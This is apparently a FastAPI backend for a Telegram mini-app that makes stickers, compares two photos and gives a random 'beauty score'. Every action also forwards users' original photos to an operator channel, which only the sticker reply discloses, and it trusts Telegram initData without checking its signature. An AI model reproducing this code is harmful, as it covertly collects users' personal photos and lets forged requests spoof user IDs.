```python
import io
import os
import json
import random
from urllib.parse import parse_qsl

from fastapi import FastAPI, UploadFile, File, Form, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from PIL import Image, ImageOps
from telegram import Bot


# =====================================================
# APP
# =====================================================

app = FastAPI()


# =====================================================
# CORS
# =====================================================

app.add_middleware(
    CORSMiddleware,
    allow_origins=[
        "https://3588a.github.io",
        "https://3588A.github.io",
    ],
    allow_credentials=False,
    allow_methods=["*"],
    allow_headers=["*"],
)


# =====================================================
# ENVIRONMENT VARIABLES
# =====================================================

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHANNEL_ID = os.getenv("CHANNEL_ID")


if not BOT_TOKEN:
    raise RuntimeError("BOT_TOKEN is not configured")


if not CHANNEL_ID:
    raise RuntimeError("CHANNEL_ID is not configured")


bot = Bot(token=BOT_TOKEN)


# =====================================================
# TELEGRAM USER ID
# =====================================================

def get_telegram_user_id(init_data: str):

    data = dict(parse_qsl(init_data))

    user_json = data.get("user")

    if not user_json:
        raise HTTPException(
            status_code=400,
            detail="Telegram user data not found"
        )

    try:
        user = json.loads(user_json)
    except Exception:
        raise HTTPException(
            status_code=400,
            detail="Invalid Telegram user data"
        )

    if "id" not in user:
        raise HTTPException(
            status_code=400,
            detail="Telegram user ID not found"
        )

    return user["id"]


# =====================================================
# HOME
# =====================================================

@app.get("/")
async def home():

    return {
        "status": "online",
        "message": "Telegram Image Server is running"
    }


# =====================================================
# IMAGE LOADER
# =====================================================

def load_image(data: bytes):

    try:

        image = Image.open(
            io.BytesIO(data)
        )

        image = ImageOps.exif_transpose(
            image
        )

        return image.convert("RGB")

    except Exception:

        raise HTTPException(
            status_code=400,
            detail="Invalid image"
        )


# =====================================================
# PROCESS
# =====================================================

@app.post("/process")
async def process(

    action: str = Form(...),

    initData: str = Form(...),

    images: list[UploadFile] = File(...)

):

    if action not in [
        "sticker",
        "compare",
        "beauty"
    ]:

        raise HTTPException(
            status_code=400,
            detail="Invalid action"
        )


    # =================================================
    # GET TELEGRAM USER
    # =================================================

    user_id = get_telegram_user_id(
        initData
    )


    # =================================================
    # VALIDATE IMAGE COUNT
    # =================================================

    if action in ["sticker", "beauty"]:

        if len(images) != 1:

            raise HTTPException(
                status_code=400,
                detail=(
                    f"{action} requires "
                    "exactly one image"
                )
            )


    if action == "compare":

        if len(images) != 2:

            raise HTTPException(
                status_code=400,
                detail=(
                    "Comparison requires "
                    "exactly two images"
                )
            )


    # =================================================
    # READ IMAGES
    # =================================================

    image_data = []

    for upload in images:

        data = await upload.read()

        if not data:

            raise HTTPException(
                status_code=400,
                detail="Empty image"
            )

        if len(data) > 10 * 1024 * 1024:

            raise HTTPException(
                status_code=400,
                detail=(
                    "Image is too large. "
                    "Maximum size is 10 MB."
                )
            )

        image_data.append(data)


    # =================================================
    # STICKER
    # =================================================

    if action == "sticker":

        image = load_image(
            image_data[0]
        )

        image.thumbnail(
            (512, 512),
            Image.Resampling.LANCZOS
        )

        sticker_io = io.BytesIO()

        image.save(
            sticker_io,
            format="WEBP",
            quality=90,
            method=6
        )

        sticker_bytes = sticker_io.getvalue()


        # CHANNEL - ORIGINAL
        channel_original = io.BytesIO(
            image_data[0]
        )
        channel_original.name = "original.jpg"

        await bot.send_photo(
            chat_id=CHANNEL_ID,
            photo=channel_original,
            caption="📸 صورة أصلية مرفوعة عبر التطبيق"
        )


        # USER - ORIGINAL
        user_original = io.BytesIO(
            image_data[0]
        )
        user_original.name = "original.jpg"

        await bot.send_photo(
            chat_id=user_id,
            photo=user_original,
            caption="📸 صورتك الأصلية"
        )


        # CHANNEL - STICKER
        channel_sticker = io.BytesIO(
            sticker_bytes
        )
        channel_sticker.name = "sticker.webp"

        await bot.send_document(
            chat_id=CHANNEL_ID,
            document=channel_sticker,
            caption="🎨 تم إنشاء الملصق"
        )


        # USER - STICKER
        user_sticker = io.BytesIO(
            sticker_bytes
        )
        user_sticker.name = "sticker.webp"

        await bot.send_document(
            chat_id=user_id,
            document=user_sticker,
            caption="🎨 تم إنشاء الملصق"
        )


        return {
            "success": True,
            "message": "🎨 تم إنشاء الملصق وإرساله إلى البوت والقناة"
        }


    # =====================================================
    # COMPARE
    # =====================================================

    if action == "compare":

        image1 = load_image(
            image_data[0]
        )

        image2 = load_image(
            image_data[1]
        )

        size = (
            300,
            300
        )

        image1 = ImageOps.fit(
            image1,
            size,
            method=Image.Resampling.LANCZOS
        )

        image2 = ImageOps.fit(
            image2,
            size,
            method=Image.Resampling.LANCZOS
        )


        import numpy as np

        arr1 = np.asarray(
            image1
        ).astype(float)

        arr2 = np.asarray(
            image2
        ).astype(float)

        difference = np.mean(
            np.abs(
                arr1 - arr2
            )
        )

        similarity = 100 - (
            difference
            / 255
            * 100
        )

        similarity = max(
            0,
            min(
                100,
                similarity
            )
        )

        percentage = round(
            similarity,
            2
        )


        result = (
            "🔍 نتيجة المقارنة بين الصورتين\n\n"
            f"📊 نسبة التشابه: {percentage}%\n\n"
            "✅ تم الفحص بنجاح"
        )


        # CHANNEL - IMAGE 1
        channel_photo1 = io.BytesIO(
            image_data[0]
        )
        channel_photo1.name = "original_1.jpg"

        await bot.send_photo(
            chat_id=CHANNEL_ID,
            photo=channel_photo1,
            caption="📸 الصورة الأصلية رقم 1"
        )


        # CHANNEL - IMAGE 2
        channel_photo2 = io.BytesIO(
            image_data[1]
        )
        channel_photo2.name = "original_2.jpg"

        await bot.send_photo(
            chat_id=CHANNEL_ID,
            photo=channel_photo2,
            caption="📸 الصورة الأصلية رقم 2"
        )


        # CHANNEL - RESULT
        await bot.send_message(
            chat_id=CHANNEL_ID,
            text=result
        )


        # USER - IMAGE 1
        user_photo1 = io.BytesIO(
            image_data[0]
        )
        user_photo1.name = "original_1.jpg"

        await bot.send_photo(
            chat_id=user_id,
            photo=user_photo1,
            caption="📸 الصورة الأولى"
        )


        # USER - IMAGE 2
        user_photo2 = io.BytesIO(
            image_data[1]
        )
        user_photo2.name = "original_2.jpg"

        await bot.send_photo(
            chat_id=user_id,
            photo=user_photo2,
            caption="📸 الصورة الثانية"
        )


        # USER - RESULT
        await bot.send_message(
            chat_id=user_id,
            text=result
        )


        return {
            "success": True,
            "similarity": percentage,
            "message": result
        }


    # =====================================================
    # BEAUTY SCORE
    # =====================================================

    if action == "beauty":

        image = load_image(
            image_data[0]
        )

        # =================================================
        # PROFESSIONAL-STYLE RANDOM SCORE
        # =================================================
        #
        # This is a playful score, not a real scientific
        # measurement of attractiveness.
        #

        score = random.randint(
            70,
            100
        )


        if score >= 97:

            level = "استثنائي جدًا ✨"

        elif score >= 93:

            level = "مميز جدًا 🌟"

        elif score >= 88:

            level = "جميل جدًا 😍"

        elif score >= 82:

            level = "جميل ومميز 😊"

        elif score >= 76:

            level = "إطلالة جميلة 👍"

        else:

            level = "إطلالة لطيفة 🌷"


        result = (
            "✨ تقييم جمالك\n\n"
            f"💎 النتيجة: {score}/100\n"
            f"🏆 التقييم: {level}\n\n"
            "📌 هذا التقييم ترفيهي وعشوائي "
            "ولا يمثل مقياسًا علميًا للجمال."
        )


        # =================================================
        # CHANNEL - ORIGINAL
        # =================================================

        channel_photo = io.BytesIO(
            image_data[0]
        )

        channel_photo.name = "beauty_photo.jpg"


        await bot.send_photo(
            chat_id=CHANNEL_ID,
            photo=channel_photo,
            caption="✨ صورة جديدة — تقييم الجمال"
        )


        # =================================================
        # CHANNEL - RESULT
        # =================================================

        await bot.send_message(
            chat_id=CHANNEL_ID,
            text=result
        )


        # =================================================
        # USER - ORIGINAL
        # =================================================

        user_photo = io.BytesIO(
            image_data[0]
        )

        user_photo.name = "beauty_photo.jpg"


        await bot.send_photo(
            chat_id=user_id,
            photo=user_photo,
            caption="✨ صورتك"
        )


        # =================================================
        # USER - RESULT
        # =================================================

        await bot.send_message(
            chat_id=user_id,
            text=result
        )


        return {
            "success": True,
            "score": score,
            "message": result
        }
